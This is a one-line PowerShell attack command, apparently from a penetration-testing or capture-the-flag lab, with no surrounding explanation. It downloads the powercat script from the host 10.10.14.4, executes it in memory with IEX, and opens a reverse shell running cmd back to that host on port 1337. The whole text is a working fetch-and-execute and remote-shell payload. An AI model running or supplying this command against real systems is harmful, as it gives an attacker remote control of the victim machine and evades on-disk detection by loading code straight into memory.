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version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.4/powercat.ps1');powercat -c 10.10.14.4 -p 1337 -e cmd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